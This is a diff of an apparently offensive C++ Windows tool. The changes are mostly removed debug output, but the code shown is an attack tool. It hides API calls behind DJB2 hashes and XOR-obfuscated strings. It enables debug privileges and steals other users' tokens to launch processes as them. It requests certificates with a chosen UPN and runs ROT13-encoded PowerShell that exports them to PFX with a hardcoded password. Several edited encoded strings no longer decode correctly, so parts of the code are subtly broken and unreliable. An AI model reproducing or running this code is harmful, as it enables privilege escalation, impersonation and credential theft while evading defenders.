@@ -4,7 +4,7 @@
 #include <windows.h>
 #include <winternl.h>
 #include <lm.h>
-#include "ACL.h" 
+#include "ACL.h"
 #include <iostream>
 #include <vector>
 #include <string>
@@ -12,16 +12,16 @@
 #include <memory>
 #include <algorithm>
 #include <sddl.h>
-#include <fstream>   
-#include <cstdlib>   
-#include <cstdio>    
-#include <array>    
-#include <set>       
-#include <locale>    
-#include <codecvt>   
-#include <thread>    
-#include <chrono>    
-#include <Shlwapi.h> 
+#include <fstream>
+#include <cstdlib>
+#include <cstdio>
+#include <array>
+#include <set>
+#include <locale>
+#include <codecvt>
+#include <thread>
+#include <chrono>
+#include <Shlwapi.h>
 
 std::wstring Deobfuscate(const wchar_t*, size_t, wchar_t);
 std::string rot13(const std::string&);
@@ -61,9 +61,6 @@ const std::string CSR_FILENAME_PREFIX = "My_request_";
 const std::string CER_FILENAME_PREFIX = "My_Cert_"; // Make unique too
 const std::string THUMBPRINT_FILENAME = PUBLIC_PATH + "thumbprint.txt"; // Keep single thumbprint file for simplicity
 const std::string PFX_PASSWORD = "1qaz!QAZ";
-
-
-
 
 // --- NTSTATUS Definitions ---
 #ifndef STATUS_SUCCESS
@@ -114,35 +111,34 @@ typedef HGLOBAL(WINAPI* _GlobalFree)(HGLOBAL);
 typedef BOOL(WINAPI* _LookupAccountSidW)(LPCWSTR, PSID, LPWSTR, LPDWORD, LPWSTR, LPDWORD, PSID_NAME_USE);
 typedef BOOL(WINAPI* _ConvertSidToStringSidW)(PSID, LPWSTR*);
 
-
 // --- API Hash Defines (DJB2) ---
-#define H_API_LookupPrivilegeValueW   0xBBAE6E9A // done
-#define H_API_AdjustTokenPrivileges   0xCE4CD9CB // done
-#define H_API_GetCurrentProcess          0xCA8D7527 //done
-#define H_API_OpenProcessToken           0xC57BD097 //done
-#define H_API_GetTokenInformation        0x8ED47F2C //done
-#define H_API_LocalAlloc                 0x73CEBC5B //done
-#define H_API_LocalFree                  0xA66DF372 //done
-#define H_API_IsValidSid                 0x3D180391 //done
-#define H_API_GetSidSubAuthorityCount    0x528A2BE1 //done
-#define H_API_GetSidSubAuthority         0xE58BB0B8 //done
-#define H_API_CloseHandle                0x3870CA07 //done
-#define H_API_LookupAccountSidW          0xBC518D43 //done
-#define H_API_ConvertSidToStringSidW     0x99A22DD7 //done
-#define H_API_GlobalAlloc                0xBB513941 //done
-#define H_API_GlobalFree                 0x4B816B98 //done
-#define H_API_NtQuerySystemInformation   0xEE4F73A8 //done
-#define H_API_GetCurrentProcessId        0xA3BF64B4 //done
-#define H_API_OpenProcess                0x7136FDD6 //done
-#define H_API_DuplicateHandle            0xEE96B40C //done
-#define H_API_GetLastError               0x2082EAE3 //done
-#define H_API_DuplicateTokenEx           0x7D9A8F1E //done
-#define H_API_SetTokenInformation        0xD9114A38 //done
-#define H_API_CreateProcessAsUserW       0x8B8A3C7B //done
-#define H_API_CreateProcessWithTokenW    0xB053CC42 //done
-#define H_API_WaitForSingleObject        0xCCF99AFF //done
-#define H_API_GetExitCodeProcess         0xE21026F9 //done
-#define H_API_PathFindFileNameW          0xDF9B5C8B //done
+#define H_API_LookupPrivilegeValueW 0xBBAE6E9A // done
+#define H_API_AdjustTokenPrivileges 0xCE4CD9CB // done
+#define H_API_GetCurrentProcess 0xCA8D7527 //done
+#define H_API_OpenProcessToken 0xC57BD097 //done
+#define H_API_GetTokenInformation 0x8ED47F2C //done
+#define H_API_LocalAlloc 0x73CEBC5B //done
+#define H_API_LocalFree 0xA66DF372 //done
+#define H_API_IsValidSid 0x3D180391 //done
+#define H_API_GetSidSubAuthorityCount 0x528A2BE1 //done
+#define H_API_GetSidSubAuthority 0xE58BB0B8 //done
+#define H_API_CloseHandle 0x3870CA07 //done
+#define H_API_LookupAccountSidW 0xBC518D43 //done
+#define H_API_ConvertSidToStringSidW 0x99A22DD7 //done
+#define H_API_GlobalAlloc 0xBB513941 //done
+#define H_API_GlobalFree 0x4B816B98 //done
+#define H_API_NtQuerySystemInformation 0xEE4F73A8 //done
+#define H_API_GetCurrentProcessId 0xA3BF64B4 //done
+#define H_API_OpenProcess 0x7136FDD6 //done
+#define H_API_DuplicateHandle 0xEE96B40C //done
+#define H_API_GetLastError 0x2082EAE3 //done
+#define H_API_DuplicateTokenEx 0x7D9A8F1E //done
+#define H_API_SetTokenInformation 0xD9114A38 //done
+#define H_API_CreateProcessAsUserW 0x8B8A3C7B //done
+#define H_API_CreateProcessWithTokenW 0xB053CC42 //done
+#define H_API_WaitForSingleObject 0xCCF99AFF //done
+#define H_API_GetExitCodeProcess 0xE21026F9 //done
+#define H_API_PathFindFileNameW 0xDF9B5C8B //done
 
 typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
     USHORT ProcessId;
@@ -165,7 +161,6 @@ typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
     ULONG SystemInformationLength,
     PULONG ReturnLength
     );
-
 
 typedef struct _OBJECT_TYPE_INFORMATION {
     UNICODE_STRING Name;
@@ -216,7 +211,6 @@ typedef LPWSTR(WINAPI* _PathFindFileNameW)(LPCWSTR);
 
 typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
 
-
 // NTDLL
 typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -224,8 +218,6 @@ typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
     ULONG SystemInformationLength,
     PULONG ReturnLength
     );
-
-
 
 unsigned long hash_djb2(const char* str) {
     unsigned long hash = 5381;
@@ -251,7 +243,6 @@ FARPROC GetProcAddressByHash(HMODULE hModule, unsigned long hash) {
 
     for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
         const char* funcName = (const char*)hModule + funcNames[i];
-        //printf("[HASHDBG] Export: %s => 0x%08lX\n", funcName, hash_djb2(funcName));
         if (hash_djb2(funcName) == hash) {
             WORD ordinal = nameOrdinals[i];
             return (FARPROC)((BYTE*)hModule + funcAddrs[ordinal]);
@@ -259,10 +250,6 @@ FARPROC GetProcAddressByHash(HMODULE hModule, unsigned long hash) {
     }
     return nullptr;
 }
-
-//dddd
-
-
 
 std::string WStringToString(const std::wstring& wstr) {
     if (wstr.empty()) return std::string();
@@ -272,7 +259,6 @@ std::string WStringToString(const std::wstring& wstr) {
     return strTo;
 }
 
-
 std::wstring StringToWString(const std::string& str) {
     if (str.empty()) return std::wstring();
     int size_needed = MultiByteToWideChar(CP_ACP, 0, &str[0], (int)str.size(), NULL, 0);
@@ -281,7 +267,6 @@ std::wstring StringToWString(const std::string& str) {
     return wstrTo;
 }
 
-
 // --- Get Domain Name ---
 std::string GetUserDnsDomain() {
     std::string result = "";
@@ -289,14 +274,12 @@ std::string GetUserDnsDomain() {
 
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen("set USERDNSDOMAIN", "r"), _pclose);
     if (!pipe) {
-        wprintf(L"[!] GetUserDnsDomain: _popen() failed!\n");
         return "";
     }
 
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
         result += buffer.data();
     }
-
 
     size_t equalsPos = result.find('=');
     if (equalsPos != std::string::npos) {
@@ -311,13 +294,10 @@ std::string GetUserDnsDomain() {
             }
         }
     }
-    wprintf(L"[!] GetUserDnsDomain: Could not parse domain from 'set USERDNSDOMAIN' output.\n");
     return "";
 }
 
-
-//Certificate  Functions
-
+//Certificate Functions
 std::string trim(const std::string& str) {
     size_t first = str.find_first_not_of(" \t\r\n");
     size_t last = str.find_last_not_of(" \t\r\n");
@@ -328,15 +308,12 @@ std::string trim(const std::string& str) {
 
 // Generate INF file content
 std::string generateINF(const std::string& username, const std::string& domain, const std::string& infFilePath) {
-
     if (domain.empty() || username.empty()) {
-        wprintf(L"[!] generateINF: Username or Domain is empty. Cannot generate INF.\n");
         return "";
     }
 
     std::ofstream infFile(infFilePath);
     if (!infFile.is_open()) {
-        wprintf(L"[!] generateINF: Failed to open INF file for writing: %S\n", infFilePath.c_str());
         return "";
     }
 
@@ -365,25 +342,22 @@ std::string generateINF(const std::string& username, const std::string& domain, 
         "_continue_ = \"dns=" << domain << "&upn=" << upn << "\"\n";
 
     infFile.close();
-    wprintf(L"[*] generateINF: Successfully generated INF file: %S\n", infFilePath.c_str());
     return infFilePath;
 }
 
-//  Certificate  Functions Command 
-
+// Certificate Functions Command
 std::wstring getLatestThumbprintCommand() {
-    std::string encoded = "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyvpr Olcnff -Pbzcbeg \"gel { (Trg-PuvyqVzr Prcg:\\PheeragHfre\\Zl | JuraRpbqr { $_.UnfCevagrXrl } | Fbeg-Bject AbgSbepr -Qrfpevcvat | Fryrpg-Bject -Svefg 1).Gubhzocevag | Bhg-Svyr -Rapbqrvat NFPVP '";
-    encoded += THUMBPRINT_FILENAME; 
+    std::string encoded = "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyrpr Olcnff -Pbzcbeg \"gel { (Trg-PuvyqVzr Prcg:\\PheeragHfre\\Zl | JuraRpbqr { $_.UnfCevagrXrl } | Fbeg-Bject AbgSbepr -Qrfpevcvat | Fryrpg-Bject -Svefg 1).Gubhzocevag | Bhg-Svyr -Rapbqrvat NFPVP '";
+    encoded += THUMBPRINT_FILENAME;
     encoded += "' -ReebeNpgvingr Fgbc } pnfg { Jevg-Rree $_; rkv 1 }\"";
     std::string command = rot13(encoded);
     return StringToWString(command);
 }
 
-// Reads the thumbprint 
+// Reads the thumbprint
 std::string readThumbprintFromFile() {
     std::ifstream file(THUMBPRINT_FILENAME);
     if (!file.is_open()) {
-        wprintf(L"[!] readThumbprintFromFile: Failed to open thumbprint file: %S\n", THUMBPRINT_FILENAME.c_str());
         return "";
     }
     std::string thumbprint;
@@ -393,30 +367,26 @@ std::string readThumbprintFromFile() {
     return trim(thumbprint);
 }
 
-
 // Returns the PowerShell command string to export the PFX
-
 std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username) {
     if (thumbprint.empty() || username.empty()) {
-        wprintf(L"[!] exportPFXCommand: Thumbprint or Username is empty.\n");
         return L"";
     }
     std::string pfxFilePath = PUBLIC_PATH + username + ".pfx";
 
     // שים לב שכל מה שחשוד - מוצפן
     std::string rot_psCommand =
-        "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyvpr Olcnff -Pbzcbeg \"gel { "
+        "cbjreshy -AbCebsvyr -AbaVagreafvir -RkprcgvbafCbyrpr Olcnff -Pbzcbeg \"gel { "
         "$cnffjbeq = PbasrerapGb-FrdhrevFgevat -Fgevat '" + PFX_PASSWORD + "' -NfCynvaGrkg -Sbhe; "
         "Rkcbeg-CskPragerngvba -Preg Preg:\\\\PhgrelHfre\\\\Zl\\\\" + thumbprint +
         " -SvyrCngu '" + pfxFilePath + "' -Cnffjbeq $cnffjbeq -ReebeNpgvingr Fgbc; "
-        "Jevir-Ubfg 'Csk Rkcbegrq Fhpprffshyyl' } pnfg { Jevir-Reebe $_; rkv 1 }\"";
+        "Jevir-Ubfg 'Csk Rkcbegrq Fhpprffshyyl' } pnfg { Jevg-Rree $_; rkv 1 }\"";
 
     // בזמן ריצה - מפענחים
     std::string psCommand = rot13(rot_psCommand);
 
     return StringToWString(psCommand);
 }
-
 
 // --- Modified TOKEN Struct ---
 typedef struct {
@@ -432,13 +402,11 @@ typedef struct {
     SID_NAME_USE SidType;
 } TOKEN;
 
-
 // --- Global Variables ---
 std::vector<TOKEN> g_discoveredTokens;
 DWORD g_currentProcessIntegrity = SECURITY_MANDATORY_UNTRUSTED_RID;
 DWORD g_currentSessionId = (DWORD)-1;
 std::string g_userDnsDomain = "";
-
 
 // --- Forward Declarations ---
 bool EnablePrivilege(LPCWSTR privilegeName);
@@ -462,20 +430,13 @@ std::string readThumbprintFromFile(); // New
 std::wstring exportPFXCommand(const std::string& thumbprint, const std::string& username); // New
 void ClearInputBuffer(); // Added back for interactive input
 
-
 // --- Function Implementations ---
-
 void ClearInputBuffer() {
-
     std::wcin.clear();
-
     std::wcin.ignore((std::numeric_limits<std::streamsize>::max)(), '\n');
 }
 
-//new1
-
 // פונקציה לפיענוח XOR של מחרוזות wide
-
 // פונקציה שמקבלת מזהה ומחזירה את שם ה-privilege בפיענוח
 const wchar_t* getObfuscatedPrivilege(int privId, size_t& outLen, wchar_t& outKey) {
     // שם privilege ב-XOR 0x6A (לדוג')
@@ -503,12 +464,12 @@ const wchar_t* getObfuscatedPrivilege(int privId, size_t& outLen, wchar_t& outKe
 
 // השתמש בזה כך:
 bool EnablePrivilege(int privId) {
-    static _OpenProcessToken      MyOpenProcessToken = nullptr;
-    static _GetCurrentProcess     MyGetCurrentProcess = nullptr;
+    static _OpenProcessToken       MyOpenProcessToken = nullptr;
+    static _GetCurrentProcess      MyGetCurrentProcess = nullptr;
     static _LookupPrivilegeValueW MyLookupPrivilegeValueW = nullptr;
     static _AdjustTokenPrivileges MyAdjustTokenPrivileges = nullptr;
-    static _CloseHandle           MyCloseHandle = nullptr;
-    static _GetTokenInformation   MyGetTokenInformation = nullptr;
+    static _CloseHandle            MyCloseHandle = nullptr;
+    static _GetTokenInformation    MyGetTokenInformation = nullptr;
 
     if (!MyOpenProcessToken || !MyGetCurrentProcess || !MyLookupPrivilegeValueW || !MyAdjustTokenPrivileges || !MyCloseHandle || !MyGetTokenInformation) {
         HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
@@ -576,27 +537,22 @@ bool EnablePrivilege(int privId) {
     return false;
 }
 
-
-
-//new2
-
 bool InitializePrivileges() {
-    static _OpenProcessToken      MyOpenProcessToken = nullptr;
-    static _GetCurrentProcess     MyGetCurrentProcess = nullptr;
-    static _GetTokenInformation   MyGetTokenInformation = nullptr;
-    static _LocalAlloc            MyLocalAlloc = nullptr;
-    static _LocalFree             MyLocalFree = nullptr;
-    static _IsValidSid            MyIsValidSid = nullptr;
+    static _OpenProcessToken       MyOpenProcessToken = nullptr;
+    static _GetCurrentProcess      MyGetCurrentProcess = nullptr;
+    static _GetTokenInformation    MyGetTokenInformation = nullptr;
+    static _LocalAlloc             MyLocalAlloc = nullptr;
+    static _LocalFree              MyLocalFree = nullptr;
+    static _IsValidSid             MyIsValidSid = nullptr;
     static _GetSidSubAuthorityCount MyGetSidSubAuthorityCount = nullptr;
     static _GetSidSubAuthority    MyGetSidSubAuthority = nullptr;
-    static _CloseHandle           MyCloseHandle = nullptr;
+    static _CloseHandle            MyCloseHandle = nullptr;
 
     if (!MyOpenProcessToken) {
         HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
         HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
 
         if (!hKernel32 || !hAdvapi32) {
-            wprintf(L"[!] Failed to load kernel32.dll or advapi32.dll\n");
             return false;
         }
 
@@ -611,7 +567,6 @@ bool InitializePrivileges() {
         MyCloseHandle = (_CloseHandle)GetProcAddressByHash(hKernel32, H_API_CloseHandle);
     }
 
-    wprintf(L"[*] Initializing privileges...\n");
     // קרא לפי מזהה ולא לפי שם גלוי
     EnablePrivilege(0); // SeDebugPrivilege
     EnablePrivilege(1); // SeAssignPrimaryTokenPrivilege
@@ -642,88 +597,57 @@ bool InitializePrivileges() {
         cbSize = sizeof(DWORD);
         if (!MyGetTokenInformation(hCurrentToken, TokenSessionId, &g_currentSessionId, cbSize, &cbSize)) {
             g_currentSessionId = (DWORD)-1;
-            wprintf(L"[!] Warning: Could not get current process session ID. Error: %lu\n", GetLastError());
         }
         MyCloseHandle(hCurrentToken);
     }
     else {
-        wprintf(L"[!] Could not open current process token. Error: %lu\n", GetLastError());
     }
-
-    wprintf(L"[*] Current Process Info: SessionID=%lu, Integrity=0x%lX\n",
-        (g_currentSessionId == (DWORD)-1) ? 0 : g_currentSessionId,
-        g_currentProcessIntegrity);
 
     // קרא שוב לפי מזהה, לקבל תשובה ולהציג הודעה מתאימה אם תרצה (אם חובה)
-    bool seDebugOk = EnablePrivilege(0);
-    bool seAssignPrimaryOk = EnablePrivilege(1);
+    EnablePrivilege(0);
+    EnablePrivilege(1);
 
-    if (!seDebugOk) {
-        wprintf(L"[!] Critical privilege (SeDebugPrivilege) could not be enabled/verified. Token discovery will likely fail for many processes.\n");
-    }
-    if (!seAssignPrimaryOk) {
-        wprintf(L"[!] Privilege (SeAssignPrimaryTokenPrivilege) could not be enabled/verified. Process creation as user might fail.\n");
-    }
     return true;
 }
-
-
-
-//new3
 
 void RetrieveTokenSessionId(TOKEN& tokenInfo) {
     static _GetTokenInformation MyGetTokenInformation = nullptr;
     if (!MyGetTokenInformation) {
-
         HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
         if (!hAdvapi) {
-            wprintf(L"[!] RetrieveTokenSessionId: Failed to load advapi32.dll!\n");
             tokenInfo.SessionId = (DWORD)-1;
             return;
         }
-
-        //wprintf(L"[DBG][RetrieveTokenSessionId] Resolving GetTokenInformation hash...\n")
         MyGetTokenInformation = (_GetTokenInformation)GetProcAddressByHash(hAdvapi, H_API_GetTokenInformation);
-        if (!MyGetTokenInformation)
-            wprintf(L"[DBG][RetrieveTokenSessionId] Failed to resolve GetTokenInformation!\n");
     }
 
     DWORD tokenInfoLen = 0;
     DWORD sessionId = (DWORD)-1;
-    //wprintf(L"[DBG][RetrieveTokenSessionId] Calling GetTokenInformation for TokenSessionId...\n");
     if (!MyGetTokenInformation(tokenInfo.TokenHandle, TokenSessionId, &sessionId, sizeof(DWORD), &tokenInfoLen)) {
         tokenInfo.SessionId = (DWORD)-1;
-        //wprintf(L"[DBG][RetrieveTokenSessionId] GetTokenInformation failed! LastError=%lu\n", GetLastError());
     }
     else {
         tokenInfo.SessionId = sessionId;
-        //wprintf(L"[DBG][RetrieveTokenSessionId] TokenSessionId for handle: %lu\n", sessionId);
     }
 }
 
-
-
-//new4
 void RetrieveTokenUserInfo(TOKEN& tokenInfo) {
     // Resolve פעם אחת בלבד (static)
-    static _GetTokenInformation      MyGetTokenInformation = nullptr;
-    static _LookupAccountSidW       MyLookupAccountSidW = nullptr;
-    static _ConvertSidToStringSidW  MyConvertSidToStringSidW = nullptr;
+    static _GetTokenInformation       MyGetTokenInformation = nullptr;
+    static _LookupAccountSidW         MyLookupAccountSidW = nullptr;
+    static _ConvertSidToStringSidW   MyConvertSidToStringSidW = nullptr;
     static _GlobalAlloc             MyGlobalAlloc = nullptr;
     static _GlobalFree              MyGlobalFree = nullptr;
     static _LocalFree               MyLocalFree = nullptr;
 
     if (!MyGetTokenInformation || !MyLookupAccountSidW || !MyConvertSidToStringSidW || !MyGlobalAlloc || !MyGlobalFree || !MyLocalFree) {
-        //wprintf(L"[DBG][RetrieveTokenUserInfo] Resolving API hashes...\n");
         HMODULE hAdvapi = LoadLibraryW(L"advapi32.dll");
         if (!hAdvapi) {
-            wprintf(L"[!] RetrieveTokenSessionId: Failed to load advapi32.dll!\n");
             tokenInfo.SessionId = (DWORD)-1;
             return;
         }
         HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
         if (!hKernel32) {
-            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hKernel32.dll!\n");
             tokenInfo.SessionId = (DWORD)-1;
             return;
         }
@@ -748,68 +672,52 @@ void RetrieveTokenUserInfo(TOKEN& tokenInfo) {
     wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, L"");
     tokenInfo.SidType = SidTypeUnknown;
 
-    //wprintf(L"[DBG][RetrieveTokenUserInfo] Getting TokenUser info size...\n");
     MyGetTokenInformation(tokenInfo.TokenHandle, TokenUser, NULL, 0, &tokenInfoLen);
     DWORD lastErr = GetLastError();
     if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
-        //wprintf(L"[DBG][RetrieveTokenUserInfo] Allocating %lu bytes for TOKEN_USER...\n", tokenInfoLen);
         tokenUserInfo = (PTOKEN_USER)MyGlobalAlloc(GPTR, tokenInfoLen);
         if (tokenUserInfo != NULL) {
-            //wprintf(L"[DBG][RetrieveTokenUserInfo] Getting full TokenUser info...\n");
             if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenUser, tokenUserInfo, tokenInfoLen, &tokenInfoLen)) {
-                //wprintf(L"[DBG][RetrieveTokenUserInfo] Got TokenUser, resolving SID to username/domain...\n");
                 if (MyLookupAccountSidW(NULL, tokenUserInfo->User.Sid, username, &userLength, domain, &domainLength, &sidUse)) {
                     tokenInfo.SidType = sidUse;
                     wcscpy_s(tokenInfo.UsernameOnly, MAX_USERNAME_LENGTH, username);
                     wcscpy_s(tokenInfo.DomainName, MAX_DOMAINNAME_LENGTH, domain);
                     if (domainLength > 0) {
                         swprintf_s(fullName, FULL_NAME_LENGTH, L"%s\\%s", domain, username);
-                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Username: %ls | Domain: %ls\n", username, domain);
                     }
                     else {
                         wcscpy_s(fullName, FULL_NAME_LENGTH, username);
-                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Username (no domain): %ls\n", username);
                     }
                 }
                 else {
-                    //wprintf(L"[DBG][RetrieveTokenUserInfo] LookupAccountSidW failed. LastError=%lu\n", GetLastError());
                     tokenInfo.SidType = SidTypeUnknown;
                     LPWSTR sidString = nullptr;
                     if (MyConvertSidToStringSidW(tokenUserInfo->User.Sid, &sidString)) {
                         wcscpy_s(fullName, FULL_NAME_LENGTH, sidString);
-                       // wprintf(L"[DBG][RetrieveTokenUserInfo] Used ConvertSidToStringSidW: %ls\n", sidString);
                         MyLocalFree(sidString);
                     }
                     else {
                         wcscpy_s(fullName, FULL_NAME_LENGTH, L"Unknown/Lookup Failed");
-                       // wprintf(L"[DBG][RetrieveTokenUserInfo] ConvertSidToStringSidW also failed.\n");
                     }
                 }
             }
             else {
                 wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Info");
-               // wprintf(L"[DBG][RetrieveTokenUserInfo] GetTokenInformation failed for TokenUser. LastError=%lu\n", GetLastError());
             }
             MyGlobalFree(tokenUserInfo);
         }
         else {
             wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Allocating Memory for TokenUser");
-           // wprintf(L"[DBG][RetrieveTokenUserInfo] MyGlobalAlloc failed!\n");
         }
     }
     else {
         wcscpy_s(fullName, FULL_NAME_LENGTH, L"Error Getting TokenUser Size");
-      //  wprintf(L"[DBG][RetrieveTokenUserInfo] GetTokenInformation (size check) failed. LastError=%lu\n", lastErr);
     }
     wcscpy_s(tokenInfo.Username, FULL_NAME_LENGTH, fullName);
-  //  wprintf(L"[DBG][RetrieveTokenUserInfo] Final Username: %ls\n", tokenInfo.Username);
 }
 
-
-//new5
-
 void RetrieveTokenDetails(TOKEN& tokenInfo) {
-    static _GetTokenInformation      MyGetTokenInformation = nullptr;
+    static _GetTokenInformation        MyGetTokenInformation = nullptr;
     static _GlobalAlloc              MyGlobalAlloc = nullptr;
     static _GlobalFree               MyGlobalFree = nullptr;
     static _IsValidSid               MyIsValidSid = nullptr;
@@ -817,16 +725,13 @@ void RetrieveTokenDetails(TOKEN& tokenInfo) {
     static _GetSidSubAuthority       MyGetSidSubAuthority = nullptr;
 
     if (!MyGetTokenInformation || !MyGlobalAlloc || !MyGlobalFree || !MyIsValidSid || !MyGetSidSubAuthorityCount || !MyGetSidSubAuthority) {
-       // wprintf(L"[DBG][RetrieveTokenDetails] Resolving API hashes...\n");
         HMODULE hAdvapi32 = LoadLibraryW(L"advapi32.dll");
         if (!hAdvapi32) {
-            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hAdvapi32.dll!\n");
             tokenInfo.SessionId = (DWORD)-1;
             return;
         }
         HMODULE hKernel32 = LoadLibraryW(L"kernel32.dll");
         if (!hKernel32) {
-            wprintf(L"[!] RetrieveTokenSessionId: Failed to load hKernel32.dll!\n");
             tokenInfo.SessionId = (DWORD)-1;
             return;
         }
@@ -844,30 +749,25 @@ void RetrieveTokenDetails(TOKEN& tokenInfo) {
     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"N/A");
     wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"N/A");
 
-    //wprintf(L"[DBG][RetrieveTokenDetails] Querying TokenStatistics (size)...\n");
     MyGetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, NULL, 0, &returnedLength);
     DWORD lastErr = GetLastError();
     if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
-       // wprintf(L"[DBG][RetrieveTokenDetails] Allocating %lu bytes for TOKEN_STATISTICS...\n", returnedLength);
         tokenStats = (PTOKEN_STATISTICS)MyGlobalAlloc(GPTR, returnedLength);
         if (tokenStats != NULL) {
-           // wprintf(L"[DBG][RetrieveTokenDetails] Getting TOKEN_STATISTICS...\n");
             if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenStatistics, tokenStats, returnedLength, &returnedLength)) {
-              //  wprintf(L"[DBG][RetrieveTokenDetails] Got TOKEN_STATISTICS. Type: %u\n", tokenStats->TokenType);
                 if (tokenStats->TokenType == TokenPrimary) {
                     wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Primary");
                     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"-");
-                   // wprintf(L"[DBG][RetrieveTokenDetails] TokenType: Primary\n");
                 }
                 else if (tokenStats->TokenType == TokenImpersonation) {
                     wcscpy_s(tokenInfo.TokenType, TOKEN_TYPE_LENGTH, L"Impersonation");
                     SECURITY_IMPERSONATION_LEVEL impLevel = tokenStats->ImpersonationLevel;
                     switch (impLevel) {
-                    case SecurityAnonymous:      wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Anonymous"); wprintf(L"[DBG] ImpersonationLevel: Anonymous\n"); break;
-                    case SecurityIdentification: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Identification"); wprintf(L"[DBG] ImpersonationLevel: Identification\n"); break;
-                    case SecurityImpersonation:  wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Impersonation"); wprintf(L"[DBG] ImpersonationLevel: Impersonation\n"); break;
-                    case SecurityDelegation:     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Delegation"); wprintf(L"[DBG] ImpersonationLevel: Delegation\n"); break;
-                    default:                     wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Unknown"); wprintf(L"[DBG] ImpersonationLevel: Unknown(%d)\n", impLevel); break;
+                    case SecurityAnonymous:          wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Anonymous"); break;
+                    case SecurityIdentification: wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Identification"); break;
+                    case SecurityImpersonation:  wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Impersonation"); break;
+                    case SecurityDelegation:       wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Delegation"); break;
+                    default:                       wcscpy_s(tokenInfo.TokenImpersonationLevel, TOKEN_IMPERSONATION_LENGTH, L"Unknown"); break;
                     }
                     wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"-");
                 }
@@ -875,14 +775,11 @@ void RetrieveTokenDetails(TOKEN& tokenInfo) {
                 if (tokenStats->TokenType == TokenPrimary) {
                     DWORD integrityInfoLen = 0;
                     PTOKEN_MANDATORY_LABEL tokenIntegrityLabel = NULL;
-                    //wprintf(L"[DBG][RetrieveTokenDetails] Querying TokenIntegrityLevel (size)...\n");
                     MyGetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, NULL, 0, &integrityInfoLen);
                     DWORD lastErr2 = GetLastError();
                     if (lastErr2 == ERROR_INSUFFICIENT_BUFFER) {
-                        //wprintf(L"[DBG][RetrieveTokenDetails] Allocating %lu bytes for TOKEN_MANDATORY_LABEL...\n", integrityInfoLen);
                         tokenIntegrityLabel = (PTOKEN_MANDATORY_LABEL)MyGlobalAlloc(GPTR, integrityInfoLen);
                         if (tokenIntegrityLabel != NULL) {
-                           // wprintf(L"[DBG][RetrieveTokenDetails] Getting TOKEN_MANDATORY_LABEL...\n");
                             if (MyGetTokenInformation(tokenInfo.TokenHandle, TokenIntegrityLevel, tokenIntegrityLabel, integrityInfoLen, &integrityInfoLen)) {
                                 if (tokenIntegrityLabel->Label.Sid != NULL && MyIsValidSid(tokenIntegrityLabel->Label.Sid)) {
                                     DWORD dwIntegrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID;
@@ -890,56 +787,46 @@ void RetrieveTokenDetails(TOKEN& tokenInfo) {
                                     if (RIDS && *RIDS > 0) {
                                         dwIntegrityLevel = *MyGetSidSubAuthority(tokenIntegrityLabel->Label.Sid, (DWORD)(*RIDS - 1));
                                     }
-                                    //wprintf(L"[DBG][RetrieveTokenDetails] Integrity SID: 0x%lX\n", dwIntegrityLevel);
-                                    if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Untrusted"); wprintf(L"[DBG] Integrity: Untrusted\n"); }
-                                    else if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) { wcscpy_s(tokenInfo.TokenIntegrity, TOKEN_INTEGRITY_LENGTH, L"Low");       wprintf(L"[DBG] Integrity: Low\n"); }
